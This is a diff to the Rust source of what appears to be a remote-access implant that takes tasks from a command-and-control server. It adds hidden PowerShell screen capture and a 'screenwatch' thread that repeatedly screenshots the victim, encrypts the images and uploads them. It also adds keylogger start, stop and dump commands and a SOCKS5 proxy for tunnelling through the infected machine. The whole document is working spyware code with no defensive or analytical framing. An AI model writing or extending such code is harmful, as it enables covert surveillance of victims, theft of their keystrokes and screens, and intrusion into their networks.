@@ -16,8 +16,12 @@ mod commands_defense;
 mod commands_utils;
 #[path = "commands_ishell.rs"]
 mod commands_ishell;
+#[path = "keylog.rs"]
+mod keylog;
+#[path = "socks.rs"]
+mod socks;
 
-use std::sync::atomic::{AtomicU64, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::{Mutex, OnceLock};
 use std::process::Command;
 use base64::{engine::general_purpose::STANDARD, Engine as _};
@@ -31,81 +35,53 @@ fn dyn_working_hours() -> std::sync::MutexGuard<'static, String> {
     DYN_WORKING_HOURS.get_or_init(|| Mutex::new(String::new())).lock().unwrap()
 }
 
-fn do_screenshot_native() -> Result<Vec<u8>, String> {
-    use windows_sys::Win32::Graphics::Gdi::*;
-    use windows_sys::Win32::System::StationsAndDesktops::*;
-    use windows_sys::Win32::System::Threading::GetCurrentThreadId;
-    use windows_sys::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
-    use windows_sys::Win32::Foundation::FALSE;
+// ── Screenwatch globals ───────────────────────────────────────────────────────
 
-    // Raw access mask constants (not all are defined in windows-sys 0.52)
-    const WINSTA_ALL: u32 = 0x037F;
-    const READ_CTL: u32   = 0x00020000;
-    const DESK_ALL: u32   = 0x01FF | READ_CTL;
+static SCREENWATCH_STOP: AtomicBool = AtomicBool::new(false);
+static SCREENWATCH_HANDLE: OnceLock<Mutex<Option<std::thread::JoinHandle<()>>>> = OnceLock::new();
 
-    unsafe {
-        let h_orig_sta = GetProcessWindowStation();
-        let h_sta = OpenWindowStationA(c"WinSta0".as_ptr() as _, FALSE, WINSTA_ALL | READ_CTL);
-        if h_sta != 0 { SetProcessWindowStation(h_sta); }
-        let h_orig_desk = GetThreadDesktop(GetCurrentThreadId());
-        let h_desk = OpenDesktopA(c"Default".as_ptr() as _, 0, FALSE, DESK_ALL);
-        if h_desk != 0 { SetThreadDesktop(h_desk); }
+fn screenwatch_handle() -> std::sync::MutexGuard<'static, Option<std::thread::JoinHandle<()>>> {
+    SCREENWATCH_HANDLE.get_or_init(|| Mutex::new(None)).lock().unwrap()
+}
 
-        let h_dc = GetDC(0);
-        let sw = GetSystemMetrics(SM_CXSCREEN);
-        let sh = GetSystemMetrics(SM_CYSCREEN);
-        let h_mem_dc = CreateCompatibleDC(h_dc);
-        let h_bmp = CreateCompatibleBitmap(h_dc, sw, sh);
-        let h_old = SelectObject(h_mem_dc, h_bmp as _);
-        BitBlt(h_mem_dc, 0, 0, sw, sh, h_dc, 0, 0, SRCCOPY);
-        SelectObject(h_mem_dc, h_old);
-
-        let row_bytes = (sw as usize * 3 + 3) & !3;
-        let pix_bytes = row_bytes * sh as usize;
-        let mut pix_data: Vec<u8> = vec![0u8; pix_bytes];
-
-        let mut bmi = BITMAPINFO {
-            bmiHeader: BITMAPINFOHEADER {
-                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
-                biWidth: sw,
-                biHeight: sh,
-                biPlanes: 1,
-                biBitCount: 24,
-                biCompression: BI_RGB,
-                biSizeImage: 0,
-                biXPelsPerMeter: 0,
-                biYPelsPerMeter: 0,
-                biClrUsed: 0,
-                biClrImportant: 0,
-            },
-            bmiColors: [RGBQUAD { rgbBlue: 0, rgbGreen: 0, rgbRed: 0, rgbReserved: 0 }],
-        };
-        GetDIBits(h_dc, h_bmp, 0, sh as u32, pix_data.as_mut_ptr() as _, &mut bmi, DIB_RGB_COLORS);
-
-        DeleteObject(h_bmp as _);
-        DeleteDC(h_mem_dc);
-        ReleaseDC(0, h_dc);
-
-        if h_desk != 0 { SetThreadDesktop(h_orig_desk); CloseDesktop(h_desk); }
-        if h_sta != 0  { SetProcessWindowStation(h_orig_sta); CloseWindowStation(h_sta); }
-
-        if pix_bytes == 0 { return Err("capture failed".into()); }
-
-        let hdr_size = 14usize + std::mem::size_of::<BITMAPINFOHEADER>();
-        let file_size = hdr_size + pix_bytes;
-        let mut bmp = Vec::<u8>::with_capacity(file_size);
-        bmp.extend_from_slice(b"BM");
-        bmp.extend_from_slice(&(file_size as u32).to_le_bytes());
-        bmp.extend_from_slice(&0u32.to_le_bytes());
-        bmp.extend_from_slice(&(hdr_size as u32).to_le_bytes());
-        let hdr_bytes = std::slice::from_raw_parts(
-            &bmi.bmiHeader as *const BITMAPINFOHEADER as *const u8,
-            std::mem::size_of::<BITMAPINFOHEADER>(),
+fn spawn_screenwatch_thread(agent_id: String, aes_key: Vec<u8>, interval_sec: u64) {
+    SCREENWATCH_STOP.store(false, Ordering::Relaxed);
+    let handle = std::thread::spawn(move || {
+        let sc_ps = concat!(
+            "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;",
+            "$bmp=[System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]",
+            "::PrimaryScreen.Bounds.Width,",
+            "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);",
+            "$gfx=[System.Drawing.Graphics]::FromImage($bmp);",
+            "$gfx.CopyFromScreen(0,0,0,0,$bmp.Size);",
+            "$ms=[System.IO.MemoryStream]::new();",
+            "$bmp.Save($ms,'Png');",
+            "[Convert]::ToBase64String($ms.ToArray())"
         );
-        bmp.extend_from_slice(hdr_bytes);
-        bmp.extend_from_slice(&pix_data);
-        Ok(bmp)
-    }
+        while !SCREENWATCH_STOP.load(Ordering::Relaxed) {
+            if let Ok(o) = Command::new("powershell.exe")
+                .args(["-NoP", "-NonI", "-W", "Hidden", "-C", sc_ps])
+                .output()
+            {
+                if o.status.success() {
+                    let b64 = String::from_utf8_lossy(&o.stdout).trim().to_string();
+                    if let Ok(png) = STANDARD.decode(&b64) {
+                        let enc = crate::crypto::seal(&aes_key, &png);
+                        let path = format!("/upload/{}/screenwatch.png", agent_id);
+                        crate::transport::http_do("POST", &path, &enc);
+                    }
+                }
+            }
+            // Sleep in small increments so STOP flag is checked frequently
+            let mut slept_ms = 0u64;
+            let limit_ms = interval_sec * 1000;
+            while slept_ms < limit_ms && !SCREENWATCH_STOP.load(Ordering::Relaxed) {
+                std::thread::sleep(std::time::Duration::from_millis(250));
+                slept_ms += 250;
+            }
+        }
+    });
+    *screenwatch_handle() = Some(handle);
 }
 
 fn shell(cmd: &str) -> String {
@@ -528,11 +504,24 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             t.send_result(task.id, &out, "");
         }
         "SCREENSHOT" => {
-            match do_screenshot_native() {
-                Ok(bmp) => {
-                    t.upload_file(task.id, "screenshot.bmp", &bmp);
-                    t.send_result(task.id, &format!("[+] screenshot captured ({} bytes)", bmp.len()), "");
+            let sc_ps = concat!(
+                "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;",
+                "$bmp=[System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,",
+                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);",
+                "$gfx=[System.Drawing.Graphics]::FromImage($bmp);",
+                "$gfx.CopyFromScreen(0,0,0,0,$bmp.Size);",
+                "$ms=[System.IO.MemoryStream]::new();$bmp.Save($ms,'Png');",
+                "[Convert]::ToBase64String($ms.ToArray())"
+            );
+            match Command::new("powershell.exe").args(["-NoP","-NonI","-W","Hidden","-C",sc_ps]).output() {
+                Ok(o) if o.status.success() => {
+                    let b64 = String::from_utf8_lossy(&o.stdout).trim().to_string();
+                    if let Ok(png) = STANDARD.decode(&b64) {
+                        t.upload_file(task.id, "screenshot.png", &png);
+                        t.send_result(task.id, "[+] screenshot uploaded", "");
+                    } else { t.send_result(task.id, "", "base64 decode failed"); }
                 }
+                Ok(o) => t.send_result(task.id, "", &String::from_utf8_lossy(&o.stderr)),
                 Err(e) => t.send_result(task.id, "", &format!("screenshot: {}", e)),
             }
         }
@@ -746,6 +735,52 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             }
             let r = pe_exec::exec_pe(&task.payload);
             t.send_result(task.id, &r, "");
+        }
+        "SCREENWATCH_START" => {
+            let interval = if task.args.trim().starts_with('{') {
+                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+                j.get("interval").and_then(|v| v.as_u64()).unwrap_or(5)
+            } else {
+                task.args.trim().parse::<u64>().unwrap_or(5)
+            };
+            let agent_id = t.agent_id.clone();
+            let aes_key  = t.aes_key.clone();
+            spawn_screenwatch_thread(agent_id, aes_key, interval);
+            t.send_result(task.id, "[+] screenwatch started", "");
+        }
+        "SCREENWATCH_STOP" => {
+            SCREENWATCH_STOP.store(true, Ordering::Relaxed);
+            let handle = screenwatch_handle().take();
+            if let Some(h) = handle { let _ = h.join(); }
+            t.send_result(task.id, "[+] screenwatch stopped", "");
+        }
+        "KEYLOG_START" => {
+            keylog::keylog_start();
+            t.send_result(task.id, "[+] keylogger started", "");
+        }
+        "KEYLOG_STOP" => {
+            keylog::keylog_stop();
+            t.send_result(task.id, "[+] keylogger stopped", "");
+        }
+        "KEYLOG_DUMP" => {
+            let out = keylog::keylog_dump();
+            t.send_result(task.id, if out.is_empty() { "[no keystrokes]" } else { &out }, "");
+        }
+        "SOCKS_START" => {
+            let port = if task.args.trim().starts_with('{') {
+                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+                j.get("port").and_then(|v| v.as_u64()).unwrap_or(1080) as u16
+            } else {
+                task.args.trim().parse::<u16>().unwrap_or(1080)
+            };
+            match socks::socks_start(port) {
+                Ok(_) => t.send_result(task.id, &format!("[+] SOCKS5 proxy started on port {}", port), ""),
+                Err(e) => t.send_result(task.id, "", &e),
+            }
+        }
+        "SOCKS_STOP" => {
+            socks::socks_stop();
+            t.send_result(task.id, "[+] SOCKS5 proxy stopped", "");
         }
         _ => {
             // Delegate to feature modules
